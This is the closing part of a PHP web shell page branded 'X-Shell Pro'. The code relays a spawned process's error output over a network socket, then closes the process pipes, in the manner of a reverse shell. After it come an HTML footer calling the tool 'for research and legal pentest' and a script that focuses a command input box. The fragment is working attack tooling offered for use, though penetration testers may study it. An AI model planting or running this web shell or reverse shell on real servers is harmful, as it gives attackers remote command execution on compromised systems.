        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("STDERR: $input");
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
    if (!$daemon) {
        print "$string\n";
    }
}
?> 

<div class="footer">
    <a href="https://xcode.or.id" target="_blank" style="color:#00d4ff; text-decoration:none;">
        <i class="fas fa-shield-alt"></i> X-Shell Pro v<?= $VERSION ?>
    </a>
    <br>
    <span style="font-size:0.7rem;">Untuk Riset dan Pentest Legal | GNU GPL v2</span>
</div>

<script>
document.addEventListener('DOMContentLoaded', function() {
    const input = document.querySelector('input[name="home_cmd"]');
    if (input) input.focus();
    const term = document.querySelector('.terminal');
    if (term) term.scrollTop = term.scrollHeight;
});
</script>

</body>
</html>
